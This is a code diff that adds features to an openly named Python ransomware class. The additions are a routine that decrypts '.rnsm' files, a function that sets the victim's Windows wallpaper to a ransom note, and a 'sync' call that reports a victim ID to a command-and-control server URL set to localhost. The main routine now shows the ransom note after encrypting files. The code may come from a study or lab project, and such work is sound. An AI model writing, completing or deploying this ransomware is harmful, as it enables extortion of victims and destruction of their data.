@@ -6,6 +6,7 @@ import nacl.utils
 import datetime  # Handling time-related data
 import os, sys  # For system-related data handling (hostname/usernames)
 import base64, pathlib
+import ctypes
 
 # Debug variables
 c2_url = "http://localhost:5000"
@@ -93,6 +94,38 @@ class Ransomware:
             except Exception as e:
                 print(f"Error during file encryption loop: {e}")
 
+    def decrypt_file(self, filepath):
+        """Decrypt files"""
+        try:
+            if not os.path.isdir(filepath):
+                # Take the encrypted binary input of the file...
+                with open(filepath, "rb") as encrypted_file:
+                    encrypted_data = encrypted_file.read()
+                # ... decrypt it using the PyNaCl box provided by the parent object...
+                original_data = self.box.decrypt(encrypted_data)
+                # ... and write the original binary data back to the correct file path.
+                filepath = filepath.replace(".rnsm", "")
+                with open(f"{filepath}", "wb") as original_file:
+                    original_file.write(original_data)
+        except Exception as e:
+            print(f"Error during file encryption: {e}")
+
+    def change_wallpaper(self):
+        "Change the victim's wallpaper to display our ransom note"
+        # TODO: Create Server API to create customized ransom note wallpapers
+        image_path = "C:\\ransom.jpg"
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
+
+    def fear_and_loathing(self):
+        self.change_wallpaper()
+
+    def sync(self):
+        """Periodically ask for current status on the server side"""
+        payload = {
+            "victim-id": (None, self.victim_id),
+        }
+        response = httpx.post(f"{c2_url}/sync", files=payload)
+
 
 def main():
     rnsm = Ransomware()
@@ -108,6 +141,7 @@ def main():
     else:
         print("No infection found, continuing installing...")
     rnsm.start_encryption()
+    rnsm.fear_and_loathing()
 
     print(rnsm)
 
